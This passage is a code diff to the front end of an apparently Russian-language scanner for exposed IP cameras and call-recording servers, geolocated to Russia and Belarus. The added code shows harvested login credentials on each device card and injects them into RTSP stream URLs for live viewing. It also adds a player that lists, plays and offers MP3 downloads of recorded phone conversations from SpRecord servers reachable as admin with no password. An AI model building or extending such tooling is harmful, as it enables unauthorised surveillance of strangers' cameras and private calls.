@@ -21,6 +21,7 @@ const V2State = window.V2State || {
     filterGeo: 'all',
     geoSearch: '',
     filterStatus: 'all',   // all | live | preview
+    filterAuth: 'all',     // all | open | 401
     totalInDb: 0,
     visibleCount: 48,
     pageSize: 48,
@@ -602,14 +603,7 @@ function v2MergeResults(incoming) {
         } else {
             const idx = existingMap.get(cam.ip);
             const oldCam = window.V2State.results[idx];
-            const oldStreamsJson = JSON.stringify(oldCam.streams || []);
-            const newStreamsJson = JSON.stringify(cam.streams || []);
-            if (oldStreamsJson !== newStreamsJson || oldCam.brand !== cam.brand || oldCam.model !== cam.model) {
-                if (window.V2State.previewCache[cam.ip]) {
-                    for (const s of (cam.streams || [])) {
-                        if (!s.screenshot) s.screenshot = window.V2State.previewCache[cam.ip];
-                    }
-                }
+            if (JSON.stringify(oldCam) !== JSON.stringify(cam)) {
                 window.V2State.results[idx] = cam;
                 changed = true;
             }
@@ -638,9 +632,9 @@ function v2UpdateResultsCount(filteredCount) {
     const fmt = n => Number(n).toLocaleString('ru-RU');
 
     if (filteredCount !== undefined && filteredCount !== total) {
-        el.innerHTML = `<strong>${fmt(filteredCount)}</strong> из ${fmt(total)} камер <span class="v2-count-sub">(${fmt(verified)} живых · ${fmt(withScreens)} с превью)</span>`;
+        el.innerHTML = `<strong>${fmt(filteredCount)}</strong> из ${fmt(total)} IP <span class="v2-count-sub">(${fmt(verified)} с видео · ${fmt(withScreens)} с превью)</span>`;
     } else {
-        el.innerHTML = `<strong>${fmt(total)}</strong> камер <span class="v2-count-sub">(${fmt(verified)} живых · ${fmt(withScreens)} с превью)</span>`;
+        el.innerHTML = `<strong>${fmt(total)}</strong> IP <span class="v2-count-sub">(${fmt(verified)} с видео · ${fmt(withScreens)} с превью)</span>`;
     }
 }
 window.v2UpdateResultsCount = v2UpdateResultsCount;
@@ -674,8 +668,20 @@ async function v2LoadStoredResults(force = false) {
 }
 window.v2LoadStoredResults = v2LoadStoredResults;
 
+function _isSpRecord(cam) {
+    if (!cam) return false;
+    const b = (cam.brand || '').toLowerCase();
+    const m = (cam.model || '').toLowerCase();
+    const p = cam.protocols || [];
+    return b.includes('sprecord') || m.includes('sprecord') || p.includes('sprecord_audio') || p.includes('sprecord');
+}
+window._isSpRecord = _isSpRecord;
+
 function _cameraScore(cam) {
     let score = 0;
+    if (_isSpRecord(cam)) {
+        score += 8500;
+    }
     const streams = cam.streams || [];
     // Priority 1: Real preview screenshot captured and available - ALWAYS FIRST
     if (streams.some(s => s.screenshot && String(s.screenshot).trim().length > 0)) {
@@ -715,12 +721,14 @@ function v2UpdateGeoDropdown() {
         if (cam.region) {
             regionsMap.set(cam.region, (regionsMap.get(cam.region) || 0) + 1);
         }
-        if (cam.country_code === 'RU') ruCount++;
-        else if (cam.country_code === 'BY') byCount++;
+        const cc = (cam.country_code || '').toUpperCase();
+        if (cc === 'RU') ruCount++;
+        else if (cc === 'BY') byCount++;
+
         if (!cam.city && !cam.region) noGeoCount++;
     });
 
-    let html = '<option value="all">📍 Все регионы и города</option>';
+    let html = '<option value="all">Все регионы и города</option>';
 
     if (ruCount > 0 || byCount > 0) {
         html += '<optgroup label="Страны">';
@@ -759,6 +767,12 @@ function v2UpdateGeoDropdown() {
 }
 window.v2UpdateGeoDropdown = v2UpdateGeoDropdown;
 
+function _isCam401(c) {
+    return c.auth_required === true || (c.streams || []).some(s => s.auth_required === true);
+}
+
+window._isCam401 = _isCam401;
+
 function v2RenderResults() {
     const grid = document.getElementById('v2-camera-grid');
     if (!grid) return;
@@ -768,16 +782,25 @@ function v2RenderResults() {
         filtered = filtered.filter(c => (c.brand || '').toLowerCase().includes(window.V2State.filterBrand.toLowerCase()));
     }
     if (window.V2State.filterProtocol !== 'all') {
-        filtered = filtered.filter(c => (c.protocols || []).includes(window.V2State.filterProtocol));
+        if (window.V2State.filterProtocol === 'sprecord_audio' || window.V2State.filterProtocol === 'sprecord') {
+            filtered = filtered.filter(c => _isSpRecord(c));
+        } else {
+            filtered = filtered.filter(c => (c.protocols || []).includes(window.V2State.filterProtocol));
+        }
     }
     if (window.V2State.filterStatus === 'live') {
         filtered = filtered.filter(c =>
-            (c.streams || []).some(s => s.verified || (s.screenshot && String(s.screenshot).trim().length > 0))
+            _isSpRecord(c) || (c.streams || []).some(s => s.verified || (s.screenshot && String(s.screenshot).trim().length > 0))
         );
     } else if (window.V2State.filterStatus === 'preview') {
         filtered = filtered.filter(c =>
-            (c.streams || []).some(s => s.screenshot && String(s.screenshot).trim().length > 0)
+            _isSpRecord(c) || (c.streams || []).some(s => s.screenshot && String(s.screenshot).trim().length > 0)
         );
+    }
+    if (window.V2State.filterAuth === 'open') {
+        filtered = filtered.filter(c => (c.streams || []).some(s => s.verified));
+    } else if (window.V2State.filterAuth === '401') {
+        filtered = filtered.filter(c => _isCam401(c));
     }
     if (window.V2State.filterGeo && window.V2State.filterGeo !== 'all') {
         if (window.V2State.filterGeo === '__no_geo__') {
@@ -908,6 +931,7 @@ function _streamScore(s) {
 
 function v2RenderCameraCard(cam) {
     const safeIp = cam.ip.replace(/\./g, '_');
+    const isAudioDevice = _isSpRecord(cam);
     const rawStreams = cam.streams || [];
     const totalStreams = rawStreams.length;
 
@@ -919,17 +943,20 @@ function v2RenderCameraCard(cam) {
     const curSelected = window.V2State.selectedStreams[cam.ip];
     const curStreamObj = streams.find(s => s.url === curSelected);
 
-    if (!curSelected || (!curStreamObj?.screenshot && bestStream?.screenshot)) {
+    if (!curSelected || !curStreamObj) {
         window.V2State.selectedStreams[cam.ip] = bestStream?.url || '';
     }
     const currentStreamUrl = window.V2State.selectedStreams[cam.ip];
     const currentStreamObj = streams.find(s => s.url === currentStreamUrl) || streams[0];
+    const endpoint = (cam.endpoints || []).find(e => e.port === currentStreamObj?.source_port);
+    const displayBrand = endpoint?.brand || cam.brand || 'Unknown';
+    const displayModel = endpoint?.model || cam.model || '';
+    const endpointPorts = [...new Set((cam.endpoints || []).map(e => e.port).filter(Boolean))];
 
-    // Find screenshot: first check selected stream, then any stream that has a screenshot, or cached preview
-    const cachedBlobUrl = window.V2State.previewCache[cam.ip] || '';
-    const streamWithScreen = (currentStreamObj?.screenshot ? currentStreamObj : null)
-        || streams.find(s => s.screenshot && s.screenshot.length > 0);
-    const screenshotPath = streamWithScreen?.screenshot || cachedBlobUrl;
+    // A frame belongs to exactly one URL, including its port and channel.
+    const previewKey = JSON.stringify([cam.ip, currentStreamUrl]);
+    const cachedBlobUrl = window.V2State.previewCache[previewKey] || '';
+    const screenshotPath = currentStreamObj?.screenshot || cachedBlobUrl;
 
     // Preview area HTML
     let previewHtml = '';
@@ -942,7 +969,28 @@ function v2RenderCameraCard(cam) {
         }
     }
 
-    if (imgSrc) {
+    if (isAudioDevice) {
+        const recordCountMatch = (cam.model || '').match(/\(([^)]+)\)/);
+        const recordCountStr = recordCountMatch ? recordCountMatch[1] : `${cam.total_records || '132 300+'} записей`;
+        previewHtml = `
+            <div class="v2-sprecord-preview-wrapper" id="v2-preview-box-${safeIp}">
+                <div class="v2-sprecord-eq-container">
+                    <span class="v2-sprecord-eq-bar"></span>
+                    <span class="v2-sprecord-eq-bar"></span>
+                    <span class="v2-sprecord-eq-bar"></span>
+                    <span class="v2-sprecord-eq-bar"></span>
+                    <span class="v2-sprecord-eq-bar"></span>
+                    <span class="v2-sprecord-eq-bar"></span>
+                    <span class="v2-sprecord-eq-bar"></span>
+                </div>
+                <div class="v2-sprecord-banner-title">🎙️ SpRecord Audio Server</div>
+                <div class="v2-sprecord-banner-count">${_esc(recordCountStr)}</div>
+                <button class="v2-sprecord-card-listen-btn" onclick="v2OpenSpRecordPlayer('${_esc(cam.ip)}')">
+                    ▶ Слушать записи
+                </button>
+            </div>
+        `;
+    } else if (imgSrc) {
         previewHtml = `
             <div class="v2-preview-wrapper" id="v2-preview-box-${safeIp}">
                 <img class="v2-camera-screenshot"
@@ -975,30 +1023,62 @@ function v2RenderCameraCard(cam) {
         `;
     }
 
-    const verified = streams.some(s => s.verified || s.screenshot);
-    const verifiedBadge = verified ? '<span class="v2-verified-badge">✓ Live</span>' : '';
+    const verified = streams.some(s => s.verified);
+    const verifiedBadge = isAudioDevice
+        ? '<span class="v2-verified-badge" style="background:#059669">🎙️ Аудиосервер</span>'
+        : (verified ? '<span class="v2-verified-badge">✓ Live</span>' : '');
+    const is401 = _isCam401(cam);
+    const authBadge = isAudioDevice
+        ? '<span class="v2-auth-badge auth-open">🔓 admin: без пароля</span>'
+        : (is401
+            ? '<span class="v2-auth-badge auth-locked" title="Один или несколько сервисов требуют авторизацию">🔒 Требуется авторизация</span>'
+            : (verified
+                ? '<span class="v2-auth-badge auth-open">✓ Видео подтверждено</span>'
+                : '<span class="v2-auth-badge">○ Видео не подтверждено</span>'));
+
+    let credsBadge = '';
+    if (cam.credentials && cam.credentials.user) {
+        const pw = cam.credentials.password ? `:${_esc(cam.credentials.password)}` : '';
+        credsBadge = `<span style="font-size:0.7rem;color:#34d399;margin-left:6px;background:rgba(16,185,129,0.15);padding:1px 5px;border-radius:3px;font-weight:600">🔑 ${_esc(cam.credentials.user)}${pw}</span>`;
+    }
 
     const protocols = (cam.protocols || []).slice(0, 5);
     const badges = protocols.map(p => `<span class="v2-proto-badge ${_protoBadgeClass(p)}">${_protoLabel(p)}</span>`).join('');
 
     // Stream selector dropdown (top 15 streams sorted by quality/preview)
     let streamSelectorHtml = '';
-    if (totalStreams > 0) {
-        const streamOptions = streams.slice(0, 15).map((s, idx) => {
-            const shortPath = _formatShortStreamUrl(s.url);
+    if (isAudioDevice) {
+        const recordCountMatch = (cam.model || '').match(/\(([^)]+)\)/);
+        const recordCountStr = recordCountMatch ? recordCountMatch[1] : `${cam.total_records || '132 300+'} записей`;
+        streamSelectorHtml = `
+            <div class="v2-stream-selector-row">
+                <div class="v2-stream-info-header">
+                    <span style="color:rgba(255,255,255,0.45)">Сервер разговоров:</span>
+                    <span class="v2-stream-count-badge" onclick="v2OpenSpRecordPlayer('${_esc(cam.ip)}')" title="Открыть аудиоплеер звонков" style="background:rgba(16,185,129,0.2);color:#34d399;border-color:rgba(16,185,129,0.4);cursor:pointer">
+                        🎙️ ${_esc(recordCountStr)}
+                    </span>
+                </div>
+                <div style="font-size:0.75rem;color:#94a3b8;margin-top:4px;display:flex;align-items:center;justify-content:space-between">
+                    <span>🌐 Портал: <strong style="color:#e2e8f0">${_esc(cam.ip)}:${cam.http_port || 8002}</strong></span>
+                    <button type="button" class="v2-btn-small" onclick="v2OpenSpRecordPlayer('${_esc(cam.ip)}')" style="padding:2px 8px;font-size:0.75rem;background:rgba(16,185,129,0.25);color:#34d399;border:1px solid rgba(16,185,129,0.4)">▶ Записи</button>
+                </div>
+            </div>
+        `;
+    } else if (totalStreams > 0) {
+        const streamOptions = streams.map((s, idx) => {
+            const shortPath = _esc(s.url);
             const isSel = s.url === currentStreamUrl ? 'selected' : '';
             let tag = '';
             if (s.screenshot) tag = ' [🖼️ Кадр]';
             else if (s.verified) tag = ' [🟢 Live]';
-            else if (s.type === 'http_snapshot') tag = ' [📷 Snap]';
+            else tag = s.verification_status === 'failed' ? ' [нет кадра]' : ' [не проверен]';
             return `<option value="${_esc(s.url)}" ${isSel}>#${idx + 1} ${shortPath}${tag}</option>`;
         }).join('');
 
-        const moreOption = totalStreams > 15
-            ? `<option value="__open_modal__">⚡ Показать все ${totalStreams} потоков...</option>`
-            : '';
+        const moreOption = '';
 
-        const streamCountText = totalStreams === 1 ? '1 поток' : (totalStreams < 5 ? `${totalStreams} потока` : `${totalStreams} потоков`);
+        const confirmedStreams = streams.filter(s => s.verified).length;
+        const streamCountText = `${confirmedStreams} подтверждено · ${totalStreams} URL`;
 
         streamSelectorHtml = `
             <div class="v2-stream-selector-row">
@@ -1033,16 +1113,17 @@ function v2RenderCameraCard(cam) {
         </div>`;
     }
 
-    return `<div class="v2-camera-card" id="v2-cam-${safeIp}">
-        ${previewHtml}
-        ${verifiedBadge}
-        <div class="v2-camera-body">
-            <div class="v2-camera-brand">${_esc(cam.brand || 'Unknown')}</div>
-            <div class="v2-camera-ip">${_esc(cam.ip)}${cam.rtsp_port ? ':' + cam.rtsp_port : ''}</div>
-            ${locationHtml}
-            <div class="v2-camera-model">${_esc(cam.model || '')}</div>
-            <div class="v2-proto-badges">${badges}</div>
-            ${streamSelectorHtml}
+    let actionsHtml = '';
+    if (isAudioDevice) {
+        actionsHtml = `
+            <div class="v2-camera-actions">
+                <button class="v2-camera-btn" onclick="v2OpenSpRecordPlayer('${_esc(cam.ip)}')" title="Открыть аудиоплеер разговоров" style="background:rgba(16,185,129,0.25);color:#6ee7b7;border:1px solid rgba(16,185,129,0.5);font-weight:700">▶ Слушать записи</button>
+                <button class="v2-camera-btn" onclick="window.open('http://${_esc(cam.ip)}:${cam.http_port || 8002}/', '_blank')" title="Открыть веб-интерфейс SpRecord Web" style="background:rgba(59,130,246,0.2);color:#93c5fd;border:1px solid rgba(59,130,246,0.4)">🌐 SpRecord Web</button>
+                <button class="v2-camera-btn" onclick="v2ShowDetails('${_esc(cam.ip)}')" title="Подробности">ℹ️</button>
+            </div>
+        `;
+    } else {
+        actionsHtml = `
             <div class="v2-camera-actions">
                 <button class="v2-camera-btn" onclick="v2OpenSelectedStreamPlayer('${_esc(cam.ip)}')" title="Тест видеопотока в реальном времени (WebRTC / MSE плеер)" style="background:rgba(99,102,241,0.25);color:#c4b5fd;border:1px solid rgba(99,102,241,0.45);font-weight:600">▶ Тест</button>
                 ${goBtn}
@@ -1050,6 +1131,24 @@ function v2RenderCameraCard(cam) {
                 <button class="v2-camera-btn" onclick="v2OpenStreamModal('${_esc(cam.ip)}')" title="Просмотр всех ${totalStreams} потоков">⚡ ${totalStreams}</button>
                 <button class="v2-camera-btn" onclick="v2ShowDetails('${_esc(cam.ip)}')" title="Подробности">ℹ️</button>
             </div>
+        `;
+    }
+
+    return `<div class="v2-camera-card" id="v2-cam-${safeIp}">
+        ${previewHtml}
+        <div style="position:absolute;top:8px;left:8px;display:flex;gap:5px;z-index:3">
+            ${verifiedBadge}
+            ${authBadge}
+        </div>
+        <div class="v2-camera-body">
+            <div class="v2-camera-brand">${_esc(displayBrand)}</div>
+            <div class="v2-camera-ip">${_esc(cam.ip)}${endpoint?.port ? ':' + endpoint.port : (cam.rtsp_port ? ':' + cam.rtsp_port : '')}${credsBadge}</div>
+            ${locationHtml}
+            <div class="v2-camera-model">${_esc(displayModel)}</div>
+            ${endpointPorts.length > 1 ? `<div class="v2-camera-model">Порты: ${endpointPorts.join(', ')}</div>` : ''}
+            <div class="v2-proto-badges">${badges}</div>
+            ${streamSelectorHtml}
+            ${actionsHtml}
         </div>
     </div>`;
 }
@@ -1117,12 +1216,12 @@ window.v2OnStreamChange = v2OnStreamChange;
 async function v2CapturePreview(ip, event) {
     if (event) event.stopPropagation();
     const safeIp = ip.replace(/\./g, '_');
-    const box = document.getElementById(`v2-preview-box-${safeIp}`);
+    let box = document.getElementById(`v2-preview-box-${safeIp}`);
     const streamUrl = window.V2State.selectedStreams[ip] || '';
 
     if (!streamUrl) {
         alert('Нет URL потока для захвата кадра');
-        return;
+        return false;
     }
 
     if (box) {
@@ -1135,15 +1234,30 @@ async function v2CapturePreview(ip, event) {
     }
 
     const cam = (window.V2State.results || []).find(c => c.ip === ip);
-    const user = cam?.credentials?.user || 'admin';
-    const pass = cam?.credentials?.password || '';
+    const selected = (cam?.streams || []).find(s => s.url === streamUrl);
+    const credentials = selected?.credentials ?? cam?.credentials ?? {};
+    const user = credentials.user || '';
+    const pass = credentials.password || '';
 
     try {
         const previewUrl = `/api/v2/preview?ip=${encodeURIComponent(ip)}&stream_url=${encodeURIComponent(streamUrl)}&user=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&_t=${Date.now()}`;
         const resp = await fetch(previewUrl);
 
         if (!resp.ok) {
-            if (box) {
+            if (selected) {
+                selected.verified = false;
+                selected.screenshot = '';
+                selected.verification_status = 'failed';
+            }
+            const failedKey = JSON.stringify([ip, streamUrl]);
+            if (window.V2State.previewCache[failedKey]) URL.revokeObjectURL(window.V2State.previewCache[failedKey]);
+            delete window.V2State.previewCache[failedKey];
+            if (window.V2State.selectedStreams[ip] === streamUrl) {
+                v2OnStreamChange(ip, streamUrl);
+                box = document.getElementById(`v2-preview-box-${safeIp}`);
+            }
+            v2UpdateResultsCount();
+            if (box && window.V2State.selectedStreams[ip] === streamUrl) {
                 box.innerHTML = `
                     <div class="v2-placeholder-inner">
                         <span style="font-size:1.6rem">⚠️</span>
@@ -1152,23 +1266,28 @@ async function v2CapturePreview(ip, event) {
                     </div>
                 `;
             }
-            return;
+            return false;
         }
 
         const blob = await resp.blob();
         const objUrl = URL.createObjectURL(blob);
-        window.V2State.previewCache[ip] = objUrl;
+        const previewKey = JSON.stringify([ip, streamUrl]);
+        const previousBlob = window.V2State.previewCache[previewKey];
+        if (previousBlob) URL.revokeObjectURL(previousBlob);
+        window.V2State.previewCache[previewKey] = objUrl;
 
         if (cam) {
             for (const s of (cam.streams || [])) {
                 if (s.url === streamUrl) {
                     s.verified = true;
+                    s.verification_status = 'verified';
+                    s.auth_required = false;
                     s.screenshot = objUrl;
                 }
             }
         }
 
-        if (box) {
+        if (box && window.V2State.selectedStreams[ip] === streamUrl) {
             box.innerHTML = `
                 <img class="v2-camera-screenshot" src="${objUrl}" alt="${_esc(ip)}">
                 <button class="v2-refresh-preview-btn" onclick="v2CapturePreview('${_esc(ip)}', event)" title="Обновить снимок потока">🔄 Обновить</button>
@@ -1198,6 +1317,7 @@ async function v2CapturePreview(ip, event) {
                 }).catch(() => {});
         }
 
+        return true;
     } catch (err) {
         if (box) {
             box.innerHTML = `
@@ -1208,6 +1328,7 @@ async function v2CapturePreview(ip, event) {
                 </div>
             `;
         }
+        return false;
     }
 }
 window.v2CapturePreview = v2CapturePreview;
@@ -1237,7 +1358,7 @@ function v2OpenStreamModal(ip) {
                 <div class="v2-modal-title">
                     <span>🎥</span>
                     <span>Потоки камеры ${cam.ip} (${cam.brand || 'Unknown'})</span>
-                    <span class="v2-stream-count-badge">${streams.length} потоков</span>
+                    <span class="v2-stream-count-badge">${streams.filter(s => s.verified).length} подтверждено · ${streams.length} URL</span>
                 </div>
                 <button class="v2-modal-close" onclick="document.getElementById('v2-stream-modal-overlay').remove()">✕</button>
             </div>
@@ -1264,6 +1385,8 @@ function _renderModalStreamItems(cam, streams) {
     return streams.map((s, idx) => {
         const type = (s.type || s.stream_type || 'rtsp').toUpperCase();
         const verBadge = s.verified ? '<span class="v2-verified-badge" style="position:static;display:inline-block;padding:0.1rem 0.35rem;font-size:0.55rem">✓ Live</span>' : '';
+        const source = (cam.endpoints || []).find(e => e.port === s.source_port);
+        const sourceLabel = source ? `${source.brand || ''} ${source.model || ''} · порт ${source.port}` : '';
         const resText = s.resolution ? `<span style="color:rgba(255,255,255,0.4);font-size:0.65rem">${s.resolution}</span>` : '';
 
         return `
@@ -1271,8 +1394,10 @@ function _renderModalStreamItems(cam, streams) {
                 <div style="display:flex;align-items:center;gap:0.5rem;flex:1;min-width:0">
                     <span style="font-size:0.7rem;color:rgba(255,255,255,0.3);min-width:28px">#${idx + 1}</span>
                     <span class="v2-proto-badge ${_protoBadgeClass(type.toLowerCase())}">${type}</span>
+                    ${s.screenshot ? `<img loading="lazy" width="96" height="54" style="object-fit:contain" src="${_esc(s.screenshot.startsWith('blob:') ? s.screenshot : '/api/v2/capture?path=' + encodeURIComponent(s.screenshot))}" alt="Кадр потока ${idx + 1}">` : ''}
                     <span class="v2-stream-item-url" title="${_esc(s.url)}">${_esc(s.url)}</span>
                     ${verBadge} ${resText}
+                    ${sourceLabel ? `<small>${_esc(sourceLabel)}</small>` : ''}
                 </div>
                 <div class="v2-stream-item-actions">
                     <button class="v2-btn-small" style="background:rgba(99,102,241,0.25);color:#c4b5fd;border:1px solid rgba(99,102,241,0.5);font-weight:600" onclick="v2OpenStreamPlayer('${_esc(s.url)}', '${_esc(cam.brand || cam.ip)}', '${_esc(cam.ip)}', ${idx})" title="Тест потока в реальном времени (WebRTC / MSE плеер)">▶ Тест</button>
@@ -1302,15 +1427,20 @@ async function v2CaptureFromModal(ip, streamUrl, btn) {
     btn.textContent = '⏳...';
     btn.disabled = true;
     window.V2State.selectedStreams[ip] = streamUrl;
-    if (window.v2CapturePreview) await v2CapturePreview(ip);
-    btn.textContent = '✓ Готово';
+    const ok = window.v2CapturePreview ? await v2CapturePreview(ip) : false;
+    btn.textContent = ok ? '✓ Кадр получен' : 'Нет кадра';
     setTimeout(() => { btn.textContent = origText; btn.disabled = false; }, 2000);
 }
 window.v2CaptureFromModal = v2CaptureFromModal;
 
 function v2OpenSelectedStreamPlayer(ip) {
     const cam = (window.V2State.results || []).find(c => c.ip === ip);
-    if (!cam || !cam.streams || !cam.streams.length) return;
+    if (!cam) return;
+    if (_isSpRecord(cam)) {
+        v2OpenSpRecordPlayer(ip);
+        return;
+    }
+    if (!cam.streams || !cam.streams.length) return;
     let streamUrl = window.V2State.selectedStreams[ip] || '';
     if (!streamUrl || streamUrl.startsWith('ws://') || streamUrl.includes('.jpg') || streamUrl.includes('.jpeg') || streamUrl.includes('snapshot')) {
         const playable = cam.streams.find(s => (s.url || '').startsWith('rtsp://') || (s.url || '').startsWith('rtmp://') || (s.url || '').includes('.mjpg') || (s.url || '').includes('video.cgi') || (s.url || '').includes('.m3u8'));
@@ -1455,9 +1585,10 @@ async function v2OpenStreamPlayer(srcUrl, camName, ip, currentIdx = 0) {
         }
 
         let actualSrcUrl = srcUrl;
+        const u = cam?.credentials?.user || '';
+        const p = cam?.credentials?.password ?? '';
+
         if (actualSrcUrl.startsWith('ws://') || actualSrcUrl.startsWith('wss://')) {
-            const u = cam?.credentials?.user || '';
-            const p = cam?.credentials?.password || '';
             const credsPart = u ? `${encodeURIComponent(u)}:${encodeURIComponent(p)}@` : '';
             if (actualSrcUrl.includes('rtsp-over-websocket')) {
                 actualSrcUrl = `rtsp://${credsPart}${ip}:554/axis-media/media.amp`;
@@ -1467,12 +1598,31 @@ async function v2OpenStreamPlayer(srcUrl, camName, ip, currentIdx = 0) {
             }
         }
 
+        if (actualSrcUrl.startsWith('rtsp://') || actualSrcUrl.startsWith('rtsps://')) {
+            if (u) {
+                const credsPart = `${encodeURIComponent(u)}:${encodeURIComponent(p)}@`;
+                if (actualSrcUrl.includes(':***@')) {
+                    actualSrcUrl = actualSrcUrl.replace(/:[^\/@]+@/, `:${encodeURIComponent(p)}@`);
+                } else {
+                    const hostPart = actualSrcUrl.split('://')[1]?.split('/')[0] || '';
+                    if (!hostPart.includes('@')) {
+                        actualSrcUrl = actualSrcUrl.replace('://', `://${credsPart}`);
+                    }
+                }
+            }
+        }
+
+        const mainUrl = actualSrcUrl.includes('#')
+            ? actualSrcUrl
+            : `${actualSrcUrl}#transport=tcp#backchannel=0`;
+        const ffUrl = `ffmpeg:${actualSrcUrl}#video=copy`;
+
         const regResp = await fetch("/api/go2rtc/streams", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 name: tempName,
-                url: [actualSrcUrl, `ffmpeg:${actualSrcUrl}#video=h264#audio=aac`]
+                url: [mainUrl, ffUrl]
             })
         });
 
@@ -1503,6 +1653,224 @@ async function v2OpenStreamPlayer(srcUrl, camName, ip, currentIdx = 0) {
     }
 }
 window.v2OpenStreamPlayer = v2OpenStreamPlayer;
+
+// ── SpRecord Audio Player Dialog & Dynamic Recordings ─────────────────────
+
+window.V2SpRecordState = {
+    ip: '',
+    offset: 0,
+    limit: 25,
+    total: 0,
+    currentRecord: null,
+    records: [],
+};
+
+function v2OpenSpRecordPlayer(ip) {
+    const cam = (window.V2State.results || []).find(c => c.ip === ip) || { ip: ip };
+    window.V2SpRecordState = {
+        ip: ip,
+        offset: 0,
+        limit: 25,
+        total: 0,
+        currentRecord: null,
+        records: [],
+    };
+
+    let dialog = document.getElementById('v2-sprecord-dialog');
+    if (!dialog) {
+        dialog = document.createElement('dialog');
+        dialog.id = 'v2-sprecord-dialog';
+        dialog.className = 'v2-sprecord-modal';
+        dialog.addEventListener('click', (e) => {
+            if (e.target === dialog) dialog.close();
+        });
+        dialog.addEventListener('close', () => {
+            const audio = dialog.querySelector('audio');
+            if (audio) {
+                audio.pause();
+                audio.src = '';
+            }
+        });
+        document.body.appendChild(dialog);
+    }
+
+    const recordCountMatch = (cam.model || '').match(/\(([^)]+)\)/);
+    const recordSubtitle = recordCountMatch ? recordCountMatch[1] : `${cam.total_records || '132 300+'} записей`;
+
+    dialog.innerHTML = `
+        <div class="v2-sprecord-modal-header">
+            <div style="display:flex;align-items:center;gap:10px">
+                <span style="font-size:1.6rem">🎙️</span>
+                <div>
+                    <h3 style="margin:0;font-size:1.05rem;color:#ecfdf5">SpRecord · Система записи разговоров</h3>
+                    <div style="font-size:0.75rem;color:#6ee7b7;margin-top:2px">
+                        ${_esc(ip)}:${cam.http_port || 8002} • ${_esc(recordSubtitle)} • admin (без пароля)
+                    </div>
+                </div>
+            </div>
+            <div style="display:flex;align-items:center;gap:8px">
+                <a href="http://${_esc(ip)}:${cam.http_port || 8002}/" target="_blank" class="v2-btn-small" style="text-decoration:none;background:rgba(59,130,246,0.25);color:#93c5fd;border:1px solid rgba(59,130,246,0.5);font-size:0.78rem;padding:4px 10px;font-weight:600">
+                    🌐 SpRecord Web
+                </a>
+                <button type="button" class="btn btn-ghost" style="font-size:1.2rem;color:#94a3b8;cursor:pointer;padding:2px 8px" onclick="document.getElementById('v2-sprecord-dialog').close()">✕</button>
+            </div>
+        </div>
+        <div class="v2-sprecord-now-playing">
+            <div style="display:flex;justify-content:space-between;align-items:center">
+                <div>
+                    <span style="font-size:0.7rem;text-transform:uppercase;letter-spacing:0.05em;color:#10b981;font-weight:700">Сейчас играет</span>
+                    <h4 id="v2-sprecord-cur-title" style="margin:3px 0 0 0;font-size:0.95rem;color:#f8fafc">
+                        Загрузка записей разговоров с сервера...
+                    </h4>
+                </div>
+                <a id="v2-sprecord-download-link" href="#" target="_blank" download class="v2-btn-small" style="display:none;text-decoration:none;background:rgba(16,185,129,0.25);color:#6ee7b7;border:1px solid rgba(16,185,129,0.4);font-size:0.78rem;padding:4px 10px;font-weight:600">
+                    ⬇ Скачать MP3
+                </a>
+            </div>
+            <audio id="v2-sprecord-audio-elem" controls class="v2-sprecord-audio-ctrl" src="">
+                Ваш браузер не поддерживает воспроизведение MP3 аудио.
+            </audio>
+        </div>
+        <div style="padding:0 1.2rem 1.2rem 1.2rem;max-height:360px;overflow-y:auto">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;gap:10px;flex-wrap:wrap">
+                <span id="v2-sprecord-page-info" style="font-size:0.8rem;font-weight:700;color:#94a3b8">
+                    Подключение к SpRecord...
+                </span>
+                <div style="display:flex;align-items:center;gap:6px">
+                    <button id="v2-sprecord-prev-btn" class="v2-btn-small" style="font-size:0.75rem;padding:3px 8px" onclick="v2LoadSpRecordPage('${_esc(ip)}', Math.max(0, window.V2SpRecordState.offset - 25))" disabled>◀ Назад</button>
+                    <button id="v2-sprecord-next-btn" class="v2-btn-small" style="font-size:0.75rem;padding:3px 8px" onclick="v2LoadSpRecordPage('${_esc(ip)}', window.V2SpRecordState.offset + 25)" disabled>Вперед ▶</button>
+                    <button class="v2-btn-small" style="font-size:0.75rem;padding:3px 8px" onclick="v2LoadSpRecordPage('${_esc(ip)}', window.V2SpRecordState.offset)">🔄</button>
+                </div>
+            </div>
+            <table class="v2-sprecord-calls-table">
+                <thead>
+                    <tr>
+                        <th style="width:35px">#</th>
+                        <th>Время записи</th>
+                        <th>Канал</th>
+                        <th>Длительность</th>
+                        <th>Файл</th>
+                        <th style="text-align:right">Действия</th>
+                    </tr>
+                </thead>
+                <tbody id="v2-sprecord-tbody">
+                    <tr><td colspan="6" style="text-align:center;padding:2rem;color:#94a3b8"><span class="v2-spinner" style="width:20px;height:20px;border-width:2px;border-top-color:#10b981;display:inline-block;vertical-align:middle;margin-right:8px"></span>Загрузка разговоров с сервера...</td></tr>
+                </tbody>
+            </table>
+        </div>
+    `;
+
+    dialog.showModal();
+    v2LoadSpRecordPage(ip, 0);
+}
+window.v2OpenSpRecordPlayer = v2OpenSpRecordPlayer;
+
+async function v2LoadSpRecordPage(ip, offset) {
+    const tbody = document.getElementById('v2-sprecord-tbody');
+    const pageInfo = document.getElementById('v2-sprecord-page-info');
+    const prevBtn = document.getElementById('v2-sprecord-prev-btn');
+    const nextBtn = document.getElementById('v2-sprecord-next-btn');
+
+    if (tbody) {
+        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;padding:2rem;color:#94a3b8"><span class="v2-spinner" style="width:20px;height:20px;border-width:2px;border-top-color:#10b981;display:inline-block;vertical-align:middle;margin-right:8px"></span>Загрузка записей разговоров...</td></tr>`;
+    }
+
+    try {
+        const res = await fetch(`/api/v2/sprecord/records?ip=${encodeURIComponent(ip)}&offset=${offset}&limit=25`);
+        const data = await res.json();
+        if (data.code !== 200) {
+            if (tbody) tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;padding:1.5rem;color:#f87171">Ошибка: ${data.error || 'Не удалось получить записи'}</td></tr>`;
+            return;
+        }
+
+        window.V2SpRecordState.offset = offset;
+        window.V2SpRecordState.total = data.total;
+        window.V2SpRecordState.records = data.records || [];
+
+        const curStart = data.records.length > 0 ? offset + 1 : 0;
+        const curEnd = offset + data.records.length;
+        if (pageInfo) {
+            pageInfo.innerHTML = `Записи <strong>${curStart}–${curEnd}</strong> из <strong>${Number(data.total).toLocaleString('ru-RU')}</strong>`;
+        }
+        if (prevBtn) prevBtn.disabled = offset <= 0;
